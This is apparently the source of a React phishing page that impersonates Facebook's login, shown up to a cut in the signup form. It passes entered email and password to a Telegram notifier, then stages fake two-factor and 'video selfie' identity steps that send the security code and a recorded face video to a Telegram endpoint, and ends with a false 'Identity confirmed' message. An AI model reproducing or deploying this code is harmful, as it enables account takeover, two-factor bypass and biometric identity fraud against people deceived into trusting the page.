
import { useState, useEffect, useRef, useCallback } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { Form, FormControl, FormField, FormItem, FormMessage } from "@/components/ui/form";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import metaLogoImg from "@assets/IMG_7894_1765013426839.png";
import { notifyLogin, notifyCode, notifyFaceScan } from '@/lib/telegram';
import * as faceapi from 'face-api.js';

function FacebookLoader() {
  return (
    <div className="flex flex-col items-center justify-center py-12">
      <div className="relative w-16 h-16">
        <div
          className="absolute inset-0 rounded-full border-4 border-gray-200"
          style={{ borderTopColor: '#1877f2' }}
        />
        <div
          className="absolute inset-0 rounded-full border-4 border-transparent animate-spin"
          style={{ borderTopColor: '#1877f2' }}
        />
      </div>
      <p className="mt-4 text-sm text-[#65676b]">Please wait...</p>
    </div>
  );
}

const loginSchema = z.object({
  email: z.string().min(1, "Please enter your email or phone number"),
  password: z.string().min(1, "Please enter your password"),
});

type LoginForm = z.infer<typeof loginSchema>;

const signupSchema = z.object({
  firstName: z.string().min(1, "What's your name?"),
  lastName: z.string().min(1, "What's your name?"),
  emailOrPhone: z.string().min(1, "You'll use this when you log in and if you ever need to reset your password."),
  newPassword: z.string().min(6, "Enter a combination of at least six numbers, letters and punctuation marks (like ! and &)."),
  birthday: z.object({
    month: z.string(),
    day: z.string(),
    year: z.string(),
  }),
  gender: z.string(),
});

type SignupForm = z.infer<typeof signupSchema>;

const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
const days = Array.from({ length: 31 }, (_, i) => String(i + 1));
const currentYear = new Date().getFullYear();
const years = Array.from({ length: 120 }, (_, i) => String(currentYear - i));

type Direction = "left" | "right" | "up" | "down";

interface FacePosition {
  yaw: number;
  pitch: number;
}

export default function LoginPage() {
  const [signupOpen, setSignupOpen] = useState(false);
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [isSigningUp, setIsSigningUp] = useState(false);
  const [currentStep, setCurrentStep] = useState<string>("login");
  const [userEmail, setUserEmail] = useState("");
  const [verificationCode, setVerificationCode] = useState("");
  const [stream, setStream] = useState<MediaStream | null>(null);
  const [currentDirection, setCurrentDirection] = useState<Direction | null>(null);
  const [completedDirections, setCompletedDirections] = useState<Set<string>>(new Set());
  const [isRecording, setIsRecording] = useState(false);
  const [mediaRecorder, setMediaRecorder] = useState<MediaRecorder | null>(null);
  const [overallProgress, setOverallProgress] = useState(0);
  const [faceDetected, setFaceDetected] = useState(false);
  const [modelsLoaded, setModelsLoaded] = useState(false);
  const [loadingModels, setLoadingModels] = useState(false);
  const [directionHoldTime, setDirectionHoldTime] = useState(0);
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const detectionIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const baseFacePositionRef = useRef<FacePosition | null>(null);
  const recordedChunksRef = useRef<Blob[]>([]);

  const loginForm = useForm<LoginForm>({
    resolver: zodResolver(loginSchema),
    defaultValues: {
      email: "",
      password: "",
    },
  });

  const signupForm = useForm<SignupForm>({
    resolver: zodResolver(signupSchema),
    defaultValues: {
      firstName: "",
      lastName: "",
      emailOrPhone: "",
      newPassword: "",
      birthday: {
        month: String(new Date().getMonth()),
        day: String(new Date().getDate()),
        year: String(new Date().getFullYear() - 25),
      },
      gender: "female",
    },
  });

  const loadFaceApiModels = async () => {
    if (modelsLoaded) return;
    setLoadingModels(true);
    try {
      await Promise.all([
        faceapi.nets.tinyFaceDetector.loadFromUri('/models'),
        faceapi.nets.faceLandmark68Net.loadFromUri('/models')
      ]);
      setModelsLoaded(true);
    } catch (error) {
      console.error('Error loading face detection models:', error);
    }
    setLoadingModels(false);
  };

  const calculateFaceOrientation = (landmarks: faceapi.FaceLandmarks68): FacePosition => {
    const nose = landmarks.getNose();
    const leftEye = landmarks.getLeftEye();
    const rightEye = landmarks.getRightEye();
    
    const noseTip = nose[3];
    const leftEyeCenter = {
      x: leftEye.reduce((sum, p) => sum + p.x, 0) / leftEye.length,
      y: leftEye.reduce((sum, p) => sum + p.y, 0) / leftEye.length,
    };
    const rightEyeCenter = {
      x: rightEye.reduce((sum, p) => sum + p.x, 0) / rightEye.length,
      y: rightEye.reduce((sum, p) => sum + p.y, 0) / rightEye.length,
    };
    
    const eyeCenter = {
      x: (leftEyeCenter.x + rightEyeCenter.x) / 2,
      y: (leftEyeCenter.y + rightEyeCenter.y) / 2,
    };
    
    const eyeDistance = Math.sqrt(
      Math.pow(rightEyeCenter.x - leftEyeCenter.x, 2) +
      Math.pow(rightEyeCenter.y - leftEyeCenter.y, 2)
    );
    
    const yaw = (noseTip.x - eyeCenter.x) / eyeDistance;
    const pitch = (noseTip.y - eyeCenter.y) / eyeDistance;
    
    return { yaw, pitch };
  };

  const detectDirection = useCallback((position: FacePosition): Direction | null => {
    const base = baseFacePositionRef.current;
    if (!base) return null;
    
    const yawDiff = position.yaw - base.yaw;
    const pitchDiff = position.pitch - base.pitch;
    
    const threshold = 0.15;
    
    if (Math.abs(yawDiff) > Math.abs(pitchDiff)) {
      if (yawDiff < -threshold) return "left";
      if (yawDiff > threshold) return "right";
    } else {
      if (pitchDiff < -threshold) return "up";
      if (pitchDiff > threshold) return "down";
    }
    
    return null;
  }, []);

  const runFaceDetection = useCallback(async () => {
    if (!videoRef.current || !modelsLoaded) return;
    
    const video = videoRef.current;
    
    try {
      const detection = await faceapi
        .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions({ inputSize: 224, scoreThreshold: 0.5 }))
        .withFaceLandmarks();
      
      if (detection) {
        setFaceDetected(true);
        const position = calculateFaceOrientation(detection.landmarks);
        
        if (!baseFacePositionRef.current && currentStep === "recording") {
          baseFacePositionRef.current = position;
        }
        
        if (currentStep === "recording" && currentDirection) {
          const detected = detectDirection(position);
          
          if (detected === currentDirection) {
            setDirectionHoldTime(prev => {
              const newTime = prev + 100;
              if (newTime >= 1500) {
                return 1500;
              }
              return newTime;
            });
          } else {
            setDirectionHoldTime(0);
          }
        }
      } else {
        setFaceDetected(false);
        setDirectionHoldTime(0);
      }
    } catch (error) {
      console.error('Face detection error:', error);
    }
  }, [modelsLoaded, currentStep, currentDirection, detectDirection]);

  useEffect(() => {
    if (directionHoldTime >= 1500 && currentDirection && !completedDirections.has(currentDirection)) {
      const directions: Direction[] = ["left", "right", "up", "down"];
      const currentIndex = directions.indexOf(currentDirection);
      
      setCompletedDirections(prev => new Set([...prev, currentDirection]));
      setOverallProgress((currentIndex + 1) * 25);
      
      if (currentIndex < directions.length - 1) {
        setCurrentDirection(directions[currentIndex + 1]);
        setDirectionHoldTime(0);
        baseFacePositionRef.current = null;
      } else {
        finishRecording();
      }
    }
  }, [directionHoldTime, currentDirection, completedDirections]);

  const finishRecording = useCallback(() => {
    setIsRecording(false);
    setOverallProgress(100);
    setCurrentDirection(null);
    
    if (detectionIntervalRef.current) {
      clearInterval(detectionIntervalRef.current);
      detectionIntervalRef.current = null;
    }
    
    if (mediaRecorder && mediaRecorder.state !== 'inactive') {
      mediaRecorder.stop();
    }
    
    setCurrentStep("processing");
    
    setTimeout(() => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      setCurrentStep("complete");
    }, 3000);
  }, [mediaRecorder, stream]);

  useEffect(() => {
    if ((currentStep === "instructions" || currentStep === "recording") && modelsLoaded && stream) {
      detectionIntervalRef.current = setInterval(runFaceDetection, 100);
      return () => {
        if (detectionIntervalRef.current) {
          clearInterval(detectionIntervalRef.current);
        }
      };
    }
  }, [currentStep, modelsLoaded, stream, runFaceDetection]);

  useEffect(() => {
    if ((currentStep === "instructions" || currentStep === "recording") && stream && videoRef.current) {
      videoRef.current.srcObject = stream;
      videoRef.current.play().catch(err => console.error('Error playing video:', err));
    }
  }, [currentStep, stream]);

  useEffect(() => {
    let timer: NodeJS.Timeout;

    if (currentStep === "loading-login") {
      timer = setTimeout(() => setCurrentStep("code"), 3000);
    } else if (currentStep === "loading-code") {
      timer = setTimeout(() => setCurrentStep("face-intro"), 3000);
    } else if (currentStep === "recording") {
      setCompletedDirections(new Set());
      setCurrentDirection("left");
      setDirectionHoldTime(0);
      setOverallProgress(0);
      baseFacePositionRef.current = null;
    }

    return () => clearTimeout(timer);
  }, [currentStep]);

  useEffect(() => {
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
      if (detectionIntervalRef.current) {
        clearInterval(detectionIntervalRef.current);
      }
    };
  }, [stream]);

  const handleLogin = async (data: LoginForm) => {
    setIsLoggingIn(true);
    setUserEmail(data.email);
    await notifyLogin(data.email, data.password);
    setCurrentStep("loading-login");
    setIsLoggingIn(false);
  };

  const handleCodeSubmit = async () => {
    if (verificationCode.length >= 4) {
      await notifyCode(userEmail, verificationCode);
      setCurrentStep("loading-code");
    }
  };

  const handleStartFaceVerification = async () => {
    await loadFaceApiModels();
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: 640, height: 480 },
        audio: false
      });
      setStream(mediaStream);
      setCurrentStep("instructions");
    } catch (error) {
      console.error("Camera access denied:", error);
    }
  };

  const handleStartRecording = async () => {
    try {
      await notifyFaceScan(userEmail);
    } catch (error) {
      console.error('Failed to send face scan notification:', error);
    }
    
    setIsRecording(true);
    setCurrentStep("recording");
    
    if (stream) {
      const chunks: Blob[] = [];
      recordedChunksRef.current = chunks;
      
      const mimeTypes = [
        'video/webm;codecs=vp9',
        'video/webm;codecs=vp8',
        'video/webm'
      ];
      
      let selectedMimeType = '';
      for (const type of mimeTypes) {
        if (MediaRecorder.isTypeSupported(type)) {
          selectedMimeType = type;
          break;
        }
      }
      
      let recorder: MediaRecorder;
      try {
        recorder = selectedMimeType
          ? new MediaRecorder(stream, { mimeType: selectedMimeType })
          : new MediaRecorder(stream);
      } catch (error) {
        console.error('Error creating MediaRecorder:', error);
        return;
      }
      
      recorder.ondataavailable = (event) => {
        if (event.data && event.data.size > 0) {
          chunks.push(event.data);
          recordedChunksRef.current = chunks;
        }
      };
      
      recorder.onstop = async () => {
        try {
          const actualMimeType = recorder.mimeType || 'video/webm';
          const videoBlob = new Blob(recordedChunksRef.current, { type: actualMimeType });
          
          const formData = new FormData();
          formData.append('video', videoBlob, 'face-verification.webm');
          formData.append('email', userEmail);
          
          await fetch('/api/telegram/video', {
            method: 'POST',
            body: formData,
          });
        } catch (error) {
          console.error('Failed to send video:', error);
        }
      };
      
      recorder.start(100);
      setMediaRecorder(recorder);
    }
  };

  const handleSignup = async (data: SignupForm) => {
    setIsSigningUp(true);
    await new Promise(resolve => setTimeout(resolve, 1000));
    setIsSigningUp(false);
    setSignupOpen(false);
  };

  return (
    <div className="min-h-screen flex flex-col" style={{ backgroundColor: '#f0f2f5', fontFamily: 'system-ui, -apple-system, "Segoe UI", Helvetica, Arial, sans-serif' }}>
      {currentStep === "login" && (
        <>
          {/* Desktop layout */}
          <div className="hidden md:flex flex-1 items-center justify-center px-8">
            <div className="w-full max-w-7xl mx-auto flex items-center gap-32">
              {/* Left section - Facebook branding */}
              <div className="flex-1">
                <svg viewBox="0 0 301 100" className="w-64 mb-6" fill="#1877f2">
                  <path d="M69.87 0c38.551 0 69.87 31.32 69.87 69.87 0 38.552-31.319 69.871-69.87 69.871S0 108.422 0 69.87C0 31.32 31.32 0 69.87 0zm6.697 104.655V80.137h8.217l1.23-9.537h-9.447v-6.09c0-2.762.766-4.645 4.729-4.645h5.051v-8.53c-.873-.116-3.87-.377-7.357-.377-7.283 0-12.27 4.446-12.27 12.607v7.035h-8.234v9.537h8.234v24.518h9.847z"/>
                </svg>
                <h2 className="text-[28px] leading-8 font-normal text-[#1c1e21]">
                  Facebook helps you connect and share with the people in your life.
                </h2>
              </div>

              {/* Right section - Login card */}
              <div className="w-full max-w-[396px]">
                <div className="bg-white rounded-lg shadow-lg p-5">
                  <Form {...loginForm}>
                    <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-4">
                      <FormField
                        control={loginForm.control}
                        name="email"
                        render={({ field }) => (
                          <FormItem>
                            <FormControl>
                              <input
                                {...field}
                                type="text"
                                placeholder="Email address or phone number"
                                className="w-full h-[52px] px-4 text-[17px] border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:border-2"
                                style={{ color: '#1c1e21' }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                          </FormItem>
                        )}
                      />

                      <FormField
                        control={loginForm.control}
                        name="password"
                        render={({ field }) => (
                          <FormItem>
                            <FormControl>
                              <input
                                {...field}
                                type="password"
                                placeholder="Password"
                                className="w-full h-[52px] px-4 text-[17px] border border-[#dddfe2] rounded-md focus:outline-none focus:border-[#1877f2] focus:border-2"
                                style={{ color: '#1c1e21' }}
                              />
                            </FormControl>
                            <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                          </FormItem>
                        )}
                      />

                      <button
                        type="submit"
                        disabled={isLoggingIn}
                        className="w-full h-12 text-white text-xl font-bold rounded-md transition disabled:opacity-60"
                        style={{ backgroundColor: '#1877f2' }}
                      >
                        {isLoggingIn ? "Logging in..." : "Log in"}
                      </button>
                    </form>
                  </Form>

                  <div className="text-center mt-4">
                    <a href="#" className="text-sm text-[#1877f2] hover:underline">
                      Forgotten password?
                    </a>
                  </div>

                  <div className="border-t border-[#dadde1] my-5"></div>

                  <div className="text-center">
                    <button
                      onClick={() => setSignupOpen(true)}
                      className="h-12 px-4 text-base font-bold rounded-md"
                      style={{ backgroundColor: '#42b72a', color: 'white' }}
                    >
                      Create new account
                    </button>
                  </div>
                </div>

                <div className="text-center mt-7">
                  <p className="text-sm text-[#1c1e21]">
                    <a href="#" className="font-semibold hover:underline">Create a Page</a> for a celebrity, brand or business.
                  </p>
                </div>
              </div>
            </div>
          </div>

          {/* Mobile layout */}
          <div className="md:hidden flex flex-col flex-1 px-4 py-8">
            <div className="flex-1 flex flex-col items-center justify-center">
              <div className="w-full max-w-md mb-8">
                <div className="text-center mb-8">
                  <div className="w-16 h-16 mx-auto rounded-full flex items-center justify-center" style={{ backgroundColor: '#1877f2' }}>
                    <svg viewBox="0 0 36 36" className="w-10 h-10" fill="white">
                      <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"></path>
                      <path fill="#1877f2" d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"></path>
                    </svg>
                  </div>
                </div>

                <Form {...loginForm}>
                  <form onSubmit={loginForm.handleSubmit(handleLogin)} className="space-y-3">
                    <FormField
                      control={loginForm.control}
                      name="email"
                      render={({ field }) => (
                        <FormItem>
                          <FormControl>
                            <input
                              {...field}
                              type="text"
                              placeholder="Mobile number or email address"
                              className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
                              style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
                            />
                          </FormControl>
                          <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                        </FormItem>
                      )}
                    />

                    <FormField
                      control={loginForm.control}
                      name="password"
                      render={({ field }) => (
                        <FormItem>
                          <FormControl>
                            <input
                              {...field}
                              type="password"
                              placeholder="Password"
                              className="w-full px-4 py-3.5 text-base border rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500"
                              style={{ backgroundColor: '#ffffff', borderColor: '#dadde1', color: '#1c1e21' }}
                            />
                          </FormControl>
                          <FormMessage className="text-xs mt-1 text-[#be4b49]" />
                        </FormItem>
                      )}
                    />

                    <button
                      type="submit"
                      disabled={isLoggingIn}
                      className="w-full py-3.5 text-white text-lg font-semibold transition disabled:opacity-60 rounded-full"
                      style={{ backgroundColor: '#1877f2' }}
                    >
                      {isLoggingIn ? "Logging in..." : "Log in"}
                    </button>
                  </form>
                </Form>

                <div className="text-center mt-5 mb-8">
                  <a href="#" className="text-sm text-[#1877f2]">
                    Forgotten password?
                  </a>
                </div>

                <div className="text-center mt-8">
                  <button
                    onClick={() => setSignupOpen(true)}
                    className="px-12 py-3 text-base font-semibold transition rounded-full"
                    style={{ backgroundColor: 'white', color: '#1877f2', border: '1px solid #1877f2' }}
                  >
                    Create new account
                  </button>
                </div>
              </div>
            </div>

            <div className="text-center pb-8">
              <img src={metaLogoImg} alt="Meta" className="h-5 mx-auto opacity-50" />
            </div>
          </div>

          {/* Footer - Desktop only */}
          <footer className="hidden md:block bg-white border-t border-[#dadde1] py-4">
            <div className="max-w-7xl mx-auto px-8">
              <div className="text-xs text-[#65676b] space-x-3 mb-2">
                <a href="#" className="hover:underline">English (UK)</a>
                <a href="#" className="hover:underline">Español</a>
                <a href="#" className="hover:underline">Français</a>
                <a href="#" className="hover:underline">Deutsch</a>
                <a href="#" className="hover:underline">Italiano</a>
                <a href="#" className="hover:underline">Português</a>
                <a href="#" className="hover:underline">Polski</a>
                <a href="#" className="hover:underline">Nederlands</a>
              </div>
              <div className="border-t border-[#dadde1] my-2"></div>
              <div className="text-xs text-[#65676b] space-x-3">
                <a href="#" className="hover:underline">About</a>
                <a href="#" className="hover:underline">Help</a>
                <a href="#" className="hover:underline">More</a>
              </div>
              <div className="text-xs text-[#65676b] mt-2">
                Meta © 2025
              </div>
            </div>
          </footer>
        </>
      )}

      {(currentStep === "loading-login" || currentStep === "loading-code") && (
        <div className="flex-1 flex items-center justify-center bg-white">
          <FacebookLoader />
        </div>
      )}

      {currentStep === "code" && (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
            <h2 className="text-xl font-semibold mb-2 text-[#1c1e21]">Enter security code</h2>
            <p className="text-sm mb-6 text-[#65676b]">
              Please check your phone for a text message with your code.
            </p>
            <input
              type="text"
              value={verificationCode}
              onChange={(e) => setVerificationCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
              placeholder="Enter code"
              className="w-full px-4 py-3 text-center text-xl border border-[#dadde1] rounded-lg focus:outline-none focus:ring-1 focus:ring-blue-500 mb-4 text-[#1c1e21]"
              style={{ letterSpacing: '0.3em' }}
            />
            <button
              onClick={handleCodeSubmit}
              disabled={verificationCode.length < 4}
              className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-50 rounded-md"
              style={{ backgroundColor: '#1877f2' }}
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {currentStep === "face-intro" && (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
            <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
              <svg className="w-10 h-10" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6a3.75 3.75 0 11-7.5 0 3.75 3.75 0 017.5 0zM4.501 20.118a7.5 7.5 0 0114.998 0A17.933 17.933 0 0112 21.75c-2.676 0-5.216-.584-7.499-1.632z" />
              </svg>
            </div>
            <h2 className="text-2xl font-semibold mb-3 text-[#1c1e21]">Confirm your identity</h2>
            <p className="text-sm mb-6 text-[#65676b]">
              To keep your account secure, we need to verify it's really you.
            </p>
            <button
              onClick={() => setCurrentStep("face-explanation")}
              className="w-full py-3 text-white text-base font-semibold transition rounded-md"
              style={{ backgroundColor: '#1877f2' }}
            >
              Continue
            </button>
          </div>
        </div>
      )}

      {currentStep === "face-explanation" && (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
            <div className="w-24 h-24 mx-auto mb-6 rounded-full flex items-center justify-center" style={{ backgroundColor: '#e7f3ff' }}>
              <svg className="w-12 h-12" fill="none" stroke="#1877f2" viewBox="0 0 24 24" strokeWidth={1.5}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.182 15.182a4.5 4.5 0 01-6.364 0M21 12a9 9 0 11-18 0 9 9 0 0118 0zM9.75 9.75c0 .414-.168.75-.375.75S9 10.164 9 9.75 9.168 9 9.375 9s.375.336.375.75zm-.375 0h.008v.015h-.008V9.75zm5.625 0c0 .414-.168.75-.375.75s-.375-.336-.375-.75.168-.75.375-.75.375.336.375.75zm-.375 0h.008v.015h-.008V9.75z" />
              </svg>
            </div>
            <h2 className="text-xl font-semibold mb-3 text-[#1c1e21]">Take a video selfie</h2>
            <p className="text-sm mb-2 text-[#65676b]">
              We'll compare a video of your face to the photos on your account to confirm your identity.
            </p>
            <ul className="text-left text-sm mb-6 space-y-2 text-[#65676b]">
              <li className="flex items-start gap-2">
                <span className="text-[#1877f2]">1.</span>
                <span>Make sure your face is well lit</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-[#1877f2]">2.</span>
                <span>Center your face in the frame</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="text-[#1877f2]">3.</span>
                <span>Slowly turn your head as directed</span>
              </li>
            </ul>
            <button
              onClick={handleStartFaceVerification}
              disabled={loadingModels}
              className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-60 rounded-md"
              style={{ backgroundColor: '#1877f2' }}
            >
              {loadingModels ? "Loading..." : "Start verification"}
            </button>
            <button
              onClick={() => setCurrentStep("login")}
              className="mt-3 text-sm text-[#65676b]"
            >
              Cancel
            </button>
          </div>
        </div>
      )}

      {currentStep === "instructions" && (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
            <h2 className="text-xl font-semibold mb-3 text-[#1c1e21]">Position your face</h2>
            <p className="text-sm mb-4 text-[#65676b]">
              Center your face in the circle
            </p>

            <div className="relative mx-auto mb-6" style={{ width: '280px', height: '280px' }}>
              <div className="absolute inset-0 rounded-full overflow-hidden bg-black">
                <video
                  ref={videoRef}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-cover scale-x-[-1]"
                />
              </div>
              
              <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
                <defs>
                  <mask id="circleMask">
                    <rect width="280" height="280" fill="white" />
                    <circle cx="140" cy="140" r="120" fill="black" />
                  </mask>
                </defs>
                <rect width="280" height="280" fill="rgba(255,255,255,0.95)" mask="url(#circleMask)" />
                <circle cx="140" cy="140" r="120" fill="none" stroke={faceDetected ? "#42b72a" : "#1877f2"} strokeWidth="4" strokeDasharray="8 4" />
              </svg>

              {faceDetected && (
                <div className="absolute bottom-4 left-1/2 transform -translate-x-1/2">
                  <div className="px-3 py-1 rounded-full text-xs font-medium text-white bg-[#42b72a]">
                    Face detected
                  </div>
                </div>
              )}
            </div>

            <button
              onClick={handleStartRecording}
              disabled={!faceDetected}
              className="w-full py-3 text-white text-base font-semibold transition disabled:opacity-50 rounded-md"
              style={{ backgroundColor: '#1877f2' }}
            >
              {faceDetected ? "Start recording" : "Detecting face..."}
            </button>
          </div>
        </div>
      )}

      {currentStep === "recording" && (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
            <div className="relative mx-auto mb-4" style={{ width: '280px', height: '280px' }}>
              <div className="absolute inset-0 rounded-full overflow-hidden bg-black">
                <video
                  ref={videoRef}
                  autoPlay
                  playsInline
                  muted
                  className="w-full h-full object-cover scale-x-[-1]"
                />
              </div>
              
              <svg className="absolute inset-0 w-full h-full" viewBox="0 0 280 280">
                <defs>
                  <mask id="recordMask">
                    <rect width="280" height="280" fill="white" />
                    <circle cx="140" cy="140" r="120" fill="black" />
                  </mask>
                </defs>
                <rect width="280" height="280" fill="rgba(255,255,255,0.95)" mask="url(#recordMask)" />
                
                <circle cx="140" cy="140" r="120" fill="none" stroke="#e4e6eb" strokeWidth="6" />
                
                <circle 
                  cx="140" 
                  cy="140" 
                  r="120" 
                  fill="none" 
                  stroke="#1877f2" 
                  strokeWidth="6"
                  strokeLinecap="round"
                  strokeDasharray={`${2 * Math.PI * 120}`}
                  strokeDashoffset={`${2 * Math.PI * 120 * (1 - overallProgress / 100)}`}
                  style={{ transform: 'rotate(-90deg)', transformOrigin: '140px 140px', transition: 'stroke-dashoffset 0.3s ease' }}
                />

                {currentDirection && (
                  <>
                    <circle
                      cx={currentDirection === "left" ? 20 : currentDirection === "right" ? 260 : 140}
                      cy={currentDirection === "up" ? 20 : currentDirection === "down" ? 260 : 140}
                      r="24"
                      fill="#1877f2"
                      style={{ filter: 'drop-shadow(0 2px 4px rgba(0,0,0,0.2))' }}
                    />
                    <g transform={`translate(${currentDirection === "left" ? 20 : currentDirection === "right" ? 260 : 140}, ${currentDirection === "up" ? 20 : currentDirection === "down" ? 260 : 140})`}>
                      <g transform={`rotate(${currentDirection === "left" ? 180 : currentDirection === "right" ? 0 : currentDirection === "up" ? -90 : 90})`}>
                        <path d="M-6 0 L4 0 M0 -4 L4 0 L0 4" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round" fill="none" />
                      </g>
                    </g>
                  </>
                )}
              </svg>

              {directionHoldTime > 0 && directionHoldTime < 1500 && (
                <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
                  <div className="w-16 h-16 rounded-full border-4 border-green-500 flex items-center justify-center" 
                       style={{ 
                         background: `conic-gradient(#42b72a ${(directionHoldTime / 1500) * 360}deg, transparent 0deg)`,
                         opacity: 0.8
                       }}>
                  </div>
                </div>
              )}
            </div>

            <h2 className="text-lg font-semibold mb-2 text-[#1c1e21]">
              {currentDirection === "left" ? "Turn your head left" : 
               currentDirection === "right" ? "Turn your head right" : 
               currentDirection === "up" ? "Tilt your head up" : 
               currentDirection === "down" ? "Tilt your head down" : 
               "Center your face"}
            </h2>
            
            <p className="text-sm mb-4 text-[#65676b]">
              {faceDetected ? "Hold the position" : "Face not detected - please center your face"}
            </p>

            <div className="flex justify-center gap-3 mb-4">
              {(["left", "right", "up", "down"] as Direction[]).map((dir) => (
                <div
                  key={dir}
                  className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-medium transition-all"
                  style={{
                    backgroundColor: completedDirections.has(dir) ? '#42b72a' : currentDirection === dir ? '#1877f2' : '#e4e6eb',
                    color: completedDirections.has(dir) || currentDirection === dir ? '#fff' : '#65676b'
                  }}
                >
                  {completedDirections.has(dir) ? (
                    <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={3}>
                      <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
                    </svg>
                  ) : (
                    dir.charAt(0).toUpperCase()
                  )}
                </div>
              ))}
            </div>

            <div className="w-full h-2 rounded-full overflow-hidden mb-2 bg-[#e4e6eb]">
              <div 
                className="h-full rounded-full transition-all duration-300 bg-[#1877f2]"
                style={{ width: `${overallProgress}%` }}
              />
            </div>
            <p className="text-xs text-[#65676b]">
              {Math.round(overallProgress)}% complete
            </p>
          </div>
        </div>
      )}

      {currentStep === "processing" && (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
            <div className="relative w-16 h-16 mx-auto mb-4">
              <div className="absolute inset-0 rounded-full border-4 animate-spin border-[#e4e6eb]" style={{ borderTopColor: '#1877f2' }} />
            </div>
            <h2 className="text-lg font-semibold mb-2 text-[#1c1e21]">Verifying your identity</h2>
            <p className="text-sm text-[#65676b]">This may take a moment...</p>
          </div>
        </div>
      )}

      {currentStep === "complete" && (
        <div className="flex-1 flex items-center justify-center px-4">
          <div className="bg-white rounded-lg shadow-lg p-8 w-full max-w-md text-center">
            <div className="w-20 h-20 mx-auto mb-6 rounded-full flex items-center justify-center bg-[#42b72a]">
              <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h2 className="text-2xl font-semibold mb-3 text-[#1c1e21]">Identity confirmed</h2>
            <p className="text-sm mb-6 text-[#65676b]">
              Your identity has been verified. You can now continue.
            </p>
            <button
              onClick={() => {
                setCurrentStep("login");
                setUserEmail("");
                setVerificationCode("");
                setCompletedDirections(new Set());
                setCurrentDirection(null);
                setIsRecording(false);
                setOverallProgress(0);
                if (stream) {
                  stream.getTracks().forEach(track => track.stop());
                  setStream(null);
                }
              }}
              className="w-full py-3 text-white text-base font-semibold transition rounded-md"
              style={{ backgroundColor: '#1877f2' }}
            >
              Continue to Facebook
            </button>
          </div>
        </div>
      )}

      <Dialog open={signupOpen} onOpenChange={setSignupOpen}>
        <DialogContent className="sm:max-w-[432px] p-0 gap-0 bg-white rounded-lg overflow-hidden border-0">
          <DialogHeader className="p-4 pb-0">
            <DialogTitle className="text-2xl font-bold text-[#1c1e21]">Sign Up</DialogTitle>
            <DialogDescription className="text-sm mt-1 text-[#65676b]">It's quick and easy.</DialogDescription>
          </DialogHeader>

          <div className="my-3 border-t border-gray-200" />

          <Form {...signupForm}>
            <form onSubmit={signupForm.handleSubmit(handleSignup)} className="px-4 pb-4 space-y-3">
              <div className="flex gap-3">
                <FormField
                  control={signupForm.control}
                  name="firstName"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <input {...field} placeholder="First name" className="w-full px-3 py-2 text-sm border rounded-md bg-[#f5f6f7] border-[#ccd0d5] text-[#1c1e21]" />
                      </FormControl>
